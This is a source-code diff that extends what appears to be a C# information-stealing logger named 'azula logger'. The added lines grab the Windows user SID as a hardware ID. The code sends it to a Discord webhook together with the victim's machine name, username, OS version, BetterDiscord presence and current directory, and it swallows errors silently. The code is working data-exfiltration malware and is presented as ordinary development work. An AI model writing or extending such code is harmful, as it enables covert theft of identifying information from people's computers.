@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -6,6 +6,7 @@ using System.Net.Mail;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Security.Principal;
 
 namespace azula_logger
 {
@@ -21,6 +22,7 @@ namespace azula_logger
             string PCName = Environment.MachineName;
             string UserName = Environment.UserName;
             string OSVersion = (Environment.OSVersion.ToString());
+            string HWID = WindowsIdentity.GetCurrent().User.Value.ToString();
 
             string BetterDiscordDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\BetterDiscord";
             //checking if the person has betterdiscord 
@@ -33,7 +35,7 @@ namespace azula_logger
                 BetterDiscordI = "false";
             }
             //sending webhook
-            websend.sendDiscordWebhook(webhook, "azula logger", "Name: \n" + PCName + "\n\nUsername: \n" + UserName + "\n\nOS Version: \n" + OSVersion + "\n\nBetterDiscord: \n" + BetterDiscordI + "\n\nCurrent dir: \n" + CurrentDir + "\n -------------------------", image);
+            websend.sendDiscordWebhook(webhook, "azula logger", "Name: \n" + PCName + "\n\nUsername: \n" + UserName + "\n\nOS Version: \n" + OSVersion + "\n\nBetterDiscord: \n" + BetterDiscordI +  "\n\nHWID: \n" + HWID + "\n\nCurrent dir: \n" + CurrentDir + "\n -------------------------", image);
             }
             catch { }
         }
